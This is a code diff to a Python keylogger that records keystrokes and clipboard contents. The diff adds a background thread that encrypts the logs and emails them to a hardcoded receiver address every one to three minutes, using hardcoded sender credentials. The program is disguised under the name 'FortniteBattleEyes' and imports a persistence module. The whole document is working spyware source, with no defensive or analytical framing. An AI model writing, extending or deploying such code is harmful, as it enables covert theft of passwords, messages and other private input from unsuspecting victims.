@@ -6,10 +6,15 @@ import threading
 import persistance
 import pyperclip
 import time
+import random
 import os 
 
+import encryption
+import mailSender
+
+
 class keylogger():
-    def __init__(self , debug = True):
+    def __init__(self , senderAdress , senderPassword , receiverAdress , encryptionPassword = "Hooked" ,  debug = True):
         self.alive = False
         self.debug = debug
 
@@ -25,7 +30,10 @@ class keylogger():
         
         self.keyLogThread = None
         self.clipboardThread = None
+        self.mailThread = None
         
+        self.mailSock = mailSender.mailSender(senderAdress , senderPassword , receiverAdress ) 
+        self.encryptor = encryption.encryptor(encryptionPassword) 
     
     def openFilesAsA(self):
         self.keyfile =      open(self.keyfileName , "a") 
@@ -35,7 +43,6 @@ class keylogger():
         self.keyfile.close()
         self.completeFile.close()
         
-    
     def openFilesAsR(self):
         self.keyfile =      open(self.keyfileName , "r") 
         self.completeFile = open(self.completeFileName , "r")
@@ -60,7 +67,7 @@ class keylogger():
         completeFileText = self.completeFile.read()
         completeFileText = completeFileText
         
-       
+        
         
         self.closeFiles()
         
@@ -145,9 +152,11 @@ class keylogger():
         
         self.keyLogThread = threading.Thread(target=self.listener.join)
         self.clipboardThread = threading.Thread(target=self.getClipboard)
+        self.mailThread = threading.Thread(target = self.sendMails)
         
         self.clipboardThread.start()
         self.keyLogThread.start()
+        
         
         
      
@@ -159,7 +168,9 @@ class keylogger():
                 self.openFilesAsR()
                 clipboard = open(self.clipboardFileName , "r")
                 
-                to_return = " Deatailled log -> " + self.completeFile.read()  + "\nClipboard log -> " + clipboard.read() + "\n\nKeylog ->" + self.keyfile.read()       
+                to_return = " Deatailled log -> " + self.completeFile.read()  + "\n\
+                ##############################\n" + "Clipboard log -> " + clipboard.read() + "\n\
+                ##############################\n" + "Keylog ->" + self.keyfile.read()       
                 
                 self.closeFiles()
                 clipboard.close()
@@ -170,16 +181,27 @@ class keylogger():
     
     def stopKeyLog(self):
         self.alive = False
+    
+    def sendMails(self):
+        while (1):
+            to_send = self.getLog()
+            to_send = self.encryptor.encrypt(to_send)
+            self.mailSock.sendMail(to_send)
+            time.sleep(random.randrange(60,180))
+        
+        
 
 if __name__ =="__main__" :
     programPath = os.getcwd().replace("\\","/")
     programName = "FortniteBattleEyes"
     
-    p = persistance.persistance(programPath , programName)
-    t = p.installPersistance( )
-    print(t)
-    k = keylogger()
+    #p = persistance.persistance(programPath , programName)
+    #t = p.installPersistance( )
+    #print(t)
+    
+    k = keylogger("user93321245@outlook.com" , "YouHaveBeenHackedByMe02" , "yed3926@tuta.io" , "Hooked")
     k.startKeyLog()
+    print("Keylogger started")
     
     
     
